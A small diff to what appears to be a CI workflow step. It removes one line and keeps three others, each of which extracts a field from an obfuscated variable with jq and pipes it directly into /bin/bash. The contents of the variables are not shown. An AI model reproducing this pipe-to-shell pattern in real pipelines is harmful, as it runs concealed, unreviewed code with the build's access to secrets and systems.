@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$nk1" | jq -r .kjiuj31606 | /bin/bash
           printf '%s' "$di9" | jq -r .fupuc06359 | /bin/bash
-          echo $mz84263 | jq -r .c01 | /bin/bash
           printf '%s' "$e87214" | jq -r .ajvlh8610 | /bin/bash
 
       - name: Store output
